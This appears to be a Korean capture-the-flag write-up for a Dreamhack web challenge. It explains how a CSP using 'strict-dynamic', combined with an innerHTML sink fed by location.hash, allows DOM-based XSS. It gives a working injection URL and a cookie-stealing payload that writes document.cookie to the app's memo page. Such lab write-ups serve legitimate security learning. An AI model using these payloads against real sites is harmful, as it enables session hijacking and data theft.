created: 2026-01-31 17:03
category: #web 
link: https://dreamhack.io/wargame/challenges/438

# Write-up
```python
@app.after_request
def add_header(response):
    global nonce
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
    )
    nonce = os.urandom(16).hex()
    return response
```
- `script-src`에 "strict-dynamic"이라는 지시어가 있다. 이는 최초에 "self" 혹은 "nonce-{nonce}"로 인증된 스크립트가 동적으로 생성한 스크립트 또한 허용하겠다는 뜻이다. 

```html
<script nonce={{ nonce }}>
    window.addEventListener("load", function() {
      var name_elem = document.getElementById("name");
      name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
    });
</script>
{{ param | safe }}
<pre id="name"></pre>
```
- `vuln.html` 템플릿을 보면 위와 같은 코드가 있다. 
- `name_elem` 엘리먼트에 `#` 식별자 뒤의 값을 집어 넣는다. 이 때 `innerHTML`를 통해 넣는다. 따라서 HTML 코드를 설정할 수 있을 것이다.

URL에서 `#` 식별자 뒤에 `<script>alert(1)</script>`를 넣어서 스크립트를 실행할 수 있을 것으로 생각했다.
`%3Cscript%3Ealert(1)%3C/script%3E is my name !` 하지만 이런 식으로 "<"와 ">"가 URL encoding되어서 HTML로 인식되지 않았다. 

따라서 쿼리 파라미터를 활용해야겠다고 생각했고, `vuln.html`에서 HTML의 id가 "name"인 엘리먼트의 `innerHTML`을 바꾸므로 쿼리 파라미터로 `<script id="name"></script>`를 생성하면 되겠다고 생각했다. 그리고 `#` 값 뒤에는 자바스크립트 코드를 써주면 새로 생성한 `<script id="name">` 태그 내부로 들어가게 될 것이다. 
CSP가 설정되어 있으나, "strict-dynamic"이 설정되어 있어서 새로 생성된 스크립트도 허용이 될 것이다. 

다음과 같이 URL을 구성하였다.
`http://host3.dreamhack.games:20137/vuln?param=<script id="name"></script>#alert(1);//`
- `alert(1);//` 이렇게 뒤에 주석을 추가했다. 왜냐하면 실제로는 "is my name !" 문자열이 뒤에 추가로 붙는데 이것이 에러를 유발하기 때문이다. 

![[Pasted image 20260131183512.png|700]]
실행 결과 이렇게 스크립트가 잘 통하는 것을 확인할 수 있었다. 

이제 스크립트 실행 방법을 알아냈으므로 `/flag` API를 통해 플래그를 `/memo` 페이지에 쓸 차례이다.
`/flag` 페이지에서 다음과 같이 입력하였다.
- `param`: `<script id="name"></script>`
- `name`: `location.href='/memo?memo='+document.cookie;//`

![[Pasted image 20260131184233.png]]
위 이미지와 같이 정상적으로 플래그를 획득하였다.

# Reference
- https://developer.mozilla.org/en-US/docs/Web/API/Location/hash
- https://developer.mozilla.org/ko/docs/Web/API/Element/innerHTML
- https://content-security-policy.com/strict-dynamic/
- https://portswigger.net/web-security/cross-site-scripting/dom-based